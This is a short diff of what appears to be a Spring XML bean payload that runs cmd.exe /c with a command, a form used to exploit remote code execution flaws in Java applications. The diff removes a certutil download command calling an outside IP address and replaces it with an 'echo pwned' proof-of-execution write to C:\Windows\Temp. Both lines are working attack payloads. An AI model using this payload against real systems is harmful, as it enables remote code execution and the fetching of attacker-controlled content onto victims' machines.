@@ -4,7 +4,7 @@
             <list>
                 <value>cmd.exe</value>
                 <value>/c</value>
-                <value>certutil -urlcache -split -f http://2.25.92.215:8090/hit_check</value>
+                <value>echo pwned > C:\Windows\Temp\pwned.txt</value>
             </list>
         </constructor-arg>
     </bean>
